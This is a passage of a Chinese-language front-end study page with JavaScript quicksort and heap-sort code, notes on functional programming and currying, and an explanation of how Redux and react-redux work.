</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> quickSort(arr, left, right) {
    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length,
        partitionIndex,
        left <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">typeof</span> left <span style="color:#000;font-weight:bold">!=</span> <span style="color:#d14">&#39;number&#39;</span> <span style="color:#000;font-weight:bold">?</span> <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">:</span> left,
        right <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">typeof</span> right <span style="color:#000;font-weight:bold">!=</span> <span style="color:#d14">&#39;number&#39;</span> <span style="color:#000;font-weight:bold">?</span> len <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span> <span style="color:#000;font-weight:bold">:</span> right;

    <span style="color:#000;font-weight:bold">if</span> (left <span style="color:#000;font-weight:bold">&lt;</span> right) {
        partitionIndex <span style="color:#000;font-weight:bold">=</span> partition(arr, left, right);
        quickSort(arr, left, partitionIndex<span style="color:#000;font-weight:bold">-</span><span style="color:#099">1</span>);
        quickSort(arr, partitionIndex<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>, right);
    }
    <span style="color:#000;font-weight:bold">return</span> arr;
}

<span style="color:#000;font-weight:bold">function</span> partition(arr, left ,right) {     <span style="color:#998;font-style:italic">//分区操作
</span><span style="color:#998;font-style:italic"></span>    <span style="color:#000;font-weight:bold">var</span> pivot <span style="color:#000;font-weight:bold">=</span> left,                      <span style="color:#998;font-style:italic">//设定基准值（pivot）
</span><span style="color:#998;font-style:italic"></span>        index <span style="color:#000;font-weight:bold">=</span> pivot <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>;
    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> index; i <span style="color:#000;font-weight:bold">&lt;=</span> right; i<span style="color:#000;font-weight:bold">++</span>) {
        <span style="color:#000;font-weight:bold">if</span> (arr[i] <span style="color:#000;font-weight:bold">&lt;</span> arr[pivot]) {
            swap(arr, i, index);
            index<span style="color:#000;font-weight:bold">++</span>;
        }        
    }
    swap(arr, pivot, index <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span>);
    <span style="color:#000;font-weight:bold">return</span> index<span style="color:#000;font-weight:bold">-</span><span style="color:#099">1</span>;
}

<span style="color:#000;font-weight:bold">function</span> swap(arr, i, j) {
    <span style="color:#000;font-weight:bold">var</span> temp <span style="color:#000;font-weight:bold">=</span> arr[i];
    arr[i] <span style="color:#000;font-weight:bold">=</span> arr[j];
    arr[j] <span style="color:#000;font-weight:bold">=</span> temp;
}
</code></pre></td></tr></table>
</div>
</div><h3 id="堆排序">堆排序</h3>
<p><img src="http://oe51jhwvd.bkt.clouddn.com/7.gif" alt="image"></p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">var</span> len;    <span style="color:#998;font-style:italic">//因为声明的多个函数都需要数据长度，所以把len设置成为全局变量
</span><span style="color:#998;font-style:italic"></span>
<span style="color:#000;font-weight:bold">function</span> buildMaxHeap(arr) {   <span style="color:#998;font-style:italic">//建立大顶堆
</span><span style="color:#998;font-style:italic"></span>    len <span style="color:#000;font-weight:bold">=</span> arr.length;
    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">Math</span>.floor(len<span style="color:#000;font-weight:bold">/</span><span style="color:#099">2</span>); i <span style="color:#000;font-weight:bold">&amp;</span>gt;<span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>; i<span style="color:#000;font-weight:bold">--</span>) {
        heapify(arr, i);
    }
}

<span style="color:#000;font-weight:bold">function</span> heapify(arr, i) {     <span style="color:#998;font-style:italic">//堆调整
</span><span style="color:#998;font-style:italic"></span>    <span style="color:#000;font-weight:bold">var</span> left <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">2</span> <span style="color:#000;font-weight:bold">*</span> i <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>,
        right <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">2</span> <span style="color:#000;font-weight:bold">*</span> i <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">2</span>,
        largest <span style="color:#000;font-weight:bold">=</span> i;

    <span style="color:#000;font-weight:bold">if</span> (left <span style="color:#000;font-weight:bold">&lt;</span> len <span style="color:#000;font-weight:bold">&amp;&amp;</span> arr[left] <span style="color:#000;font-weight:bold">&gt;</span> arr[largest]) {
        largest <span style="color:#000;font-weight:bold">=</span> left;
    }

    <span style="color:#000;font-weight:bold">if</span> (right <span style="color:#000;font-weight:bold">&lt;</span> len <span style="color:#000;font-weight:bold">&amp;&amp;</span> arr[right] <span style="color:#000;font-weight:bold">&gt;</span> arr[largest]) {
        largest <span style="color:#000;font-weight:bold">=</span> right;
    }

    <span style="color:#000;font-weight:bold">if</span> (largest <span style="color:#000;font-weight:bold">!=</span> i) {
        swap(arr, i, largest);
        heapify(arr, largest);
    }
}

<span style="color:#000;font-weight:bold">function</span> swap(arr, i, j) {
    <span style="color:#000;font-weight:bold">var</span> temp <span style="color:#000;font-weight:bold">=</span> arr[i];
    arr[i] <span style="color:#000;font-weight:bold">=</span> arr[j];
    arr[j] <span style="color:#000;font-weight:bold">=</span> temp;
}

<span style="color:#000;font-weight:bold">function</span> heapSort(arr) {
    buildMaxHeap(arr);

    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> arr.length<span style="color:#000;font-weight:bold">-</span><span style="color:#099">1</span>; i <span style="color:#000;font-weight:bold">&gt;</span> <span style="color:#099">0</span>; i<span style="color:#000;font-weight:bold">--</span>) {
        swap(arr, <span style="color:#099">0</span>, i);
        len<span style="color:#000;font-weight:bold">--</span>;
        heapify(arr, <span style="color:#099">0</span>);
    }
    <span style="color:#000;font-weight:bold">return</span> arr;
}
</code></pre></td></tr></table>
</div>
</div><h2 id="5-函数式编程">==5. 函数式编程==</h2>
<p>函数式编程有一下几个特点：</p>
<ul>
<li>函数是“第一等公民”：函数与其他数据类型一样，可以赋值给其他变量，也可以作为参数，传入另一个函数，或作为别的函数的返回值</li>
<li>只用“表达书”，不用语句：每一步都是单纯的运算，而且都有返回值</li>
<li>没有“副作用”：函数要保持独立，所有功能就是返回一个新的值，没有其他行为，尤其不得修改外部变量的值</li>
<li>不修改状态，返回新的值，不修改系统变量</li>
<li>引用透明：函数的运行不依赖与外部变量或“状态”，只依赖于输入的参数，任何时候只要参数相同，引用函数所得到的返回值总是相同的</li>
</ul>
<p>优点：</p>
<ul>
<li>代码简洁，开发快速：函数式编程大量使用函数，减少了代码的重复，因此程序比较短，开发速度较快</li>
<li>接近自然语言，易于理解</li>
<li>更方便的代码管理：函数式编程不依赖、也不会改变外界的状态，只要给定输入参数，返回的结果必定相同。因此，每一个函数都可以被看做独立单元，很有利于进行单元测试（unit testing）和除错（debugging），以及模块化组合。</li>
<li>易于&quot;并发编程&quot;：函数式编程不需要考虑&quot;死锁&quot;（deadlock），因为它不修改变量，所以根本不存在&quot;锁&quot;线程的问题。不必担心一个线程的数据，被另一个线程修改，所以可以很放心地把工作分摊到多个线程，部署&quot;并发编程&quot;（concurrency）</li>
<li>代码的热升级：函数式编程没有副作用，只要保证接口不变，内部实现是外部无关的。所以，可以在运行状态下直接升级代码，不需要重启，也不需要停机。</li>
</ul>
<h2 id="6-函数式编程柯里化curry">==6. 函数式编程——柯里化（curry）==</h2>
<p>curry 的概念很简单：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#000;font-weight:bold">var</span> add <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">function</span>(x) {
  <span style="color:#000;font-weight:bold">return</span> <span style="color:#000;font-weight:bold">function</span>(y) {
    <span style="color:#000;font-weight:bold">return</span> x <span style="color:#000;font-weight:bold">+</span> y;
  };
};

<span style="color:#000;font-weight:bold">var</span> increment <span style="color:#000;font-weight:bold">=</span> add(<span style="color:#099">1</span>);
<span style="color:#000;font-weight:bold">var</span> addTen <span style="color:#000;font-weight:bold">=</span> add(<span style="color:#099">10</span>);

increment(<span style="color:#099">2</span>);
<span style="color:#998;font-style:italic">// 3
</span><span style="color:#998;font-style:italic"></span>
addTen(<span style="color:#099">2</span>);
<span style="color:#998;font-style:italic">// 12
</span></code></pre></td></tr></table>
</div>
</div><p>我们来创建一些 curry 函数享受下（译者注：此处原文是“for our enjoyment”，语出自圣经）</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#000;font-weight:bold">var</span> curry <span style="color:#000;font-weight:bold">=</span> require(<span style="color:#d14">&#39;lodash&#39;</span>).curry;

<span style="color:#000;font-weight:bold">var</span> match <span style="color:#000;font-weight:bold">=</span> curry(<span style="color:#000;font-weight:bold">function</span>(what, str) {
  <span style="color:#000;font-weight:bold">return</span> str.match(what);
});

<span style="color:#000;font-weight:bold">var</span> replace <span style="color:#000;font-weight:bold">=</span> curry(<span style="color:#000;font-weight:bold">function</span>(what, replacement, str) {
  <span style="color:#000;font-weight:bold">return</span> str.replace(what, replacement);
});

<span style="color:#000;font-weight:bold">var</span> filter <span style="color:#000;font-weight:bold">=</span> curry(<span style="color:#000;font-weight:bold">function</span>(f, ary) {
  <span style="color:#000;font-weight:bold">return</span> ary.filter(f);
});

<span style="color:#000;font-weight:bold">var</span> map <span style="color:#000;font-weight:bold">=</span> curry(<span style="color:#000;font-weight:bold">function</span>(f, ary) {
  <span style="color:#000;font-weight:bold">return</span> ary.map(f);
});
</code></pre></td></tr></table>
</div>
</div><p>我在上面的代码中遵循的是一种简单，同时也非常重要的模式。即策略性地把要操作的数据（String， Array）放到最后一个参数里。到使用它们的时候你就明白这样做的原因是什么了。</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">match(<span style="color:#009926">/\s+/g</span>, <span style="color:#d14">&#34;hello world&#34;</span>);
<span style="color:#998;font-style:italic">// [ &#39; &#39; ]
</span><span style="color:#998;font-style:italic"></span>
match(<span style="color:#009926">/\s+/g</span>)(<span style="color:#d14">&#34;hello world&#34;</span>);
<span style="color:#998;font-style:italic">// [ &#39; &#39; ]
</span><span style="color:#998;font-style:italic"></span>
<span style="color:#000;font-weight:bold">var</span> hasSpaces <span style="color:#000;font-weight:bold">=</span> match(<span style="color:#009926">/\s+/g</span>);
<span style="color:#998;font-style:italic">// function(x) { return x.match(/\s+/g) }
</span><span style="color:#998;font-style:italic"></span>
hasSpaces(<span style="color:#d14">&#34;hello world&#34;</span>);
<span style="color:#998;font-style:italic">// [ &#39; &#39; ]
</span><span style="color:#998;font-style:italic"></span>
hasSpaces(<span style="color:#d14">&#34;spaceless&#34;</span>);
<span style="color:#998;font-style:italic">// null
</span><span style="color:#998;font-style:italic"></span>
filter(hasSpaces, [<span style="color:#d14">&#34;tori_spelling&#34;</span>, <span style="color:#d14">&#34;tori amos&#34;</span>]);
<span style="color:#998;font-style:italic">// [&#34;tori amos&#34;]
</span><span style="color:#998;font-style:italic"></span>
<span style="color:#000;font-weight:bold">var</span> findSpaces <span style="color:#000;font-weight:bold">=</span> filter(hasSpaces);
<span style="color:#998;font-style:italic">// function(xs) { return xs.filter(function(x) { return x.match(/\s+/g) }) }
</span><span style="color:#998;font-style:italic"></span>
findSpaces([<span style="color:#d14">&#34;tori_spelling&#34;</span>, <span style="color:#d14">&#34;tori amos&#34;</span>]);
<span style="color:#998;font-style:italic">// [&#34;tori amos&#34;]
</span><span style="color:#998;font-style:italic"></span>
<span style="color:#000;font-weight:bold">var</span> noVowels <span style="color:#000;font-weight:bold">=</span> replace(<span style="color:#009926">/[aeiou]/ig</span>);
<span style="color:#998;font-style:italic">// function(replacement, x) { return x.replace(/[aeiou]/ig, replacement) }
</span><span style="color:#998;font-style:italic"></span>
<span style="color:#000;font-weight:bold">var</span> censored <span style="color:#000;font-weight:bold">=</span> noVowels(<span style="color:#d14">&#34;*&#34;</span>);
<span style="color:#998;font-style:italic">// function(x) { return x.replace(/[aeiou]/ig, &#34;*&#34;) }
</span><span style="color:#998;font-style:italic"></span>
censored(<span style="color:#d14">&#34;Chocolate Rain&#34;</span>);
<span style="color:#998;font-style:italic">// &#39;Ch*c*l*t* R**n&#39;
</span></code></pre></td></tr></table>
</div>
</div><p>这里表明的是一种“预加载”函数的能力，通过传递一到两个参数调用函数，就能得到一个记住了这些参数的新函数。</p>
<h2 id="7-redux理解">==7. redux理解==</h2>
<ol>
<li>
<p>React有props和state: props意味着父级分发下来的属性，state意味着组件内部可以自行管理的状态，并且整个React没有数据向上回溯的能力，也就是说数据只能单向向下分发，或者自行内部消化。理解这个是理解React和Redux的前提。</p>
</li>
<li>
<p>一般构建的React组件内部可能是一个完整的应用，它自己工作良好，你可以通过属性作为API控制它。但是更多的时候发现React根本无法让两个组件互相交流，使用对方的数据。然后这时候不通过DOM沟通（也就是React体制内）解决的唯一办法就是提升state，将state放到共有的父组件中来管理，再作为props分发回子组件。</p>
</li>
<li>
<p>子组件改变父组件state的办法只能是通过onClick触发父组件声明好的回调，也就是父组件提前声明好函数或方法作为契约描述自己的state将如何变化，再将它同样作为属性交给子组件使用。这样就出现了一个模式：数据总是单向从顶层向下分发的，但是只有子组件回调在概念上可以回到state顶层影响数据。这样state一定程度上是响应式的。</p>
</li>
<li>
<p>为了面临所有可能的扩展问题，最容易想到的办法就是把所有state集中放到所有组件顶层，然后分发给所有组件。</p>
</li>
<li>
<p>为了有更好的state管理，就需要一个库来作为更专业的顶层state分发给所有React应用，这就是Redux。让我们回来看看重现上面结构的需求：</p>
<ol>
<li>需要回调通知state (等同于回调参数) -&gt; action</li>
<li>需要根据回调处理 (等同于父级方法) -&gt; reducer</li>
<li>需要state (等同于总状态) -&gt; store</li>
</ol>
<p>对Redux来说只有这三个要素：</p>
<ol>
<li>action是纯声明式的数据结构，只提供事件的所有要素，不提供逻辑</li>
<li>reducer是一个匹配函数，action的发送是全局的：所有的reducer都可以捕捉到并匹配与自己相关与否，相关就拿走action中的要素进行逻辑处理，修改store中的状态，不相关就不对state做处理原样返回。</li>
<li>store负责存储状态并可以被react api回调，发布action.当然一般不会直接把两个库拿来用，还有一个binding叫react-redux, 提供一个Provider和connect。</li>
</ol>
<p>很多人其实看懂了redux卡在这里。</p>
<ol>
<li>Provider是一个普通组件，可以作为顶层app的分发点，它只需要store属性就可以了。它会将state分发给所有被connect的组件，不管它在哪里，被嵌套多少层。</li>
<li>connect是真正的重点，它是一个科里化函数，意思是先接受两个参数（数据绑定mapStateToProps和事件绑定mapDispatchToProps），再接受一个参数（将要绑定的组件本身）：mapStateToProps：构建好Redux系统的时候，它会被自动初始化，但是你的React组件并不知道它的存在，因此你需要分拣出你需要的Redux状态，所以你需要绑定一个函数，它的参数是state，简单返回你关心的几个值。</li>
</ol>
</li>
</ol>
<p>mapDispatchToProps：声明好的action作为回调，也可以被注入到组件里，就是通过这个函数，它的参数是dispatch，通过redux的辅助方法bindActionCreator绑定所有action以及参数的dispatch，就可以作为属性在组件里面作为函数简单使用了，不需要手动dispatch。这个mapDispatchToProps是可选的，如果不传这个参数redux会简单把dispatch作为属性注入给组件，可以手动当做store.dispatch使用。这也是为什么要科里化的原因。</p>
<p>做好以上流程Redux和React就可以工作了。简单地说就是：</p>
<ol>
<li>顶层分发状态，让React组件被动地渲染。</li>
<li>监听事件，事件有权利回到所有状态顶层影响状态。</li>
</ol>
<h2 id="8-虚拟dom">==8. 虚拟dom==</h2>
